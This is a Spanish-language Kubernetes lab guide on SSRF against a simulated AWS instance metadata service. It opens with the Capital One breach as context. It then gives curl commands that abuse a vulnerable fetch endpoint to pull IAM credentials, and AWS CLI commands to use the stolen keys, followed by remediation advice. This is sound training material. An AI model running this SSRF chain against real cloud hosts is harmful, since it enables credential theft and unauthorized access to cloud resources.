# Lab 1: SSRF & Acceso a Cloud Metadata

## Objetivo

Demostrar cómo una vulnerabilidad SSRF (Server-Side Request Forgery) en una aplicación web permite a un atacante acceder al Instance Metadata Service (IMDS) en `169.254.169.254` y robar credenciales IAM del nodo cloud.

## 🔴 Caso Real: Capital One (2019)

En julio de 2019, una ex-empleada de AWS explotó una vulnerabilidad SSRF en un WAF mal configurado de Capital One para acceder al IMDS de AWS. Robó credenciales IAM temporales que le permitieron acceder a más de **100 millones de registros** de clientes almacenados en S3. La multa fue de **$80 millones de dólares**. El vector exacto: SSRF → `169.254.169.254` → IAM credentials → S3 buckets.

---

## Archivos

| Archivo | Descripción |
|---------|-------------|
| `vulnerable.yaml` | App Python con SSRF + simulador de IMDS, sin NetworkPolicy |

---

## Fase 1: Desplegar Escenario Vulnerable

```bash
kubectl apply -f vulnerable.yaml
kubectl get pods -n lab1-ssrf -w
# Esperar a que ssrf-app y fake-imds estén Running
```

> El YAML despliega dos componentes:
> - **ssrf-app**: la aplicación web vulnerable a SSRF
> - **fake-imds**: un simulador del Instance Metadata Service de AWS que responde como lo haría `169.254.169.254` en un nodo EC2 real

## Fase 2: Explotación SSRF

### Paso 1: Acceder a la app

```bash
# Verificar que ambos pods estén Running
kubectl get pods -n lab1-ssrf

# Verificar los servicios
kubectl get svc -n lab1-ssrf

# Obtener la IP del nodo y acceder via NodePort
export NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
echo "App disponible en: http://$NODE_IP:31082"

# Verificar que la app responde
curl "http://$NODE_IP:31082"
# Debe mostrar la página "URL Fetcher Service"
```

### Paso 2: Probar SSRF al simulador IMDS

El simulador IMDS está accesible dentro del cluster como `fake-imds.lab1-ssrf.svc.cluster.local`.
Desde la app vulnerable, un atacante puede usar SSRF para consultarlo (simula lo que pasaría con `169.254.169.254` en AWS):

```bash
# Listar metadata disponible
curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/"
# → ami-id, instance-id, iam/, etc.

# Ver el tipo de instancia
curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/instance-type"
# → m5.xlarge

# Descubrir el IAM role del nodo
curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/iam/security-credentials/"
# → production-eks-node-role

# ROBAR credenciales IAM temporales
curl "http://$NODE_IP:31082/fetch?url=http://fake-imds.lab1-ssrf.svc.cluster.local/latest/meta-data/iam/security-credentials/production-eks-node-role"
# → AccessKeyId, SecretAccessKey, Token
```

### Paso 3: Impacto — Qué haría un atacante con las credenciales robadas

```bash
# En un entorno AWS real, con las credenciales robadas:
export AWS_ACCESS_KEY_ID="AKIA3EXAMPLE7890FAKE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBAaDFakeTokenForDemoOnly...=="

# Listar buckets S3
aws s3 ls

# Describir instancias EC2
aws ec2 describe-instances

# → CONTROL sobre recursos cloud del nodo
```

> **Nota sobre el lab**: Se usa un simulador de IMDS (`fake-imds`) dentro del cluster para que el lab funcione en entornos locales (minikube). En un cluster EKS/GKE/AKS real, la app vulnerable podría acceder directamente a `169.254.169.254` y obtener credenciales IAM reales del nodo.

## Remediación Recomendada

| Capa | Defensa | Cómo Funciona |
|------|---------|---------------|
| **Red** | NetworkPolicy egress | Bloquea tráfico a `169.254.169.254/32` desde Pods |
| **App** | Validación de URLs | Resuelve DNS, verifica IP contra rangos bloqueados |
| **Cloud** | IMDSv2 (AWS) | Requiere token PUT previo — SSRF simple no funciona |
| **Identity** | Workload Identity | Elimina la necesidad de IMDS por completo |
| **WAF** | Reglas anti-SSRF | Detecta patrones de SSRF en URLs de input |

---

## Cleanup

```bash
kubectl delete namespace lab1-ssrf
```
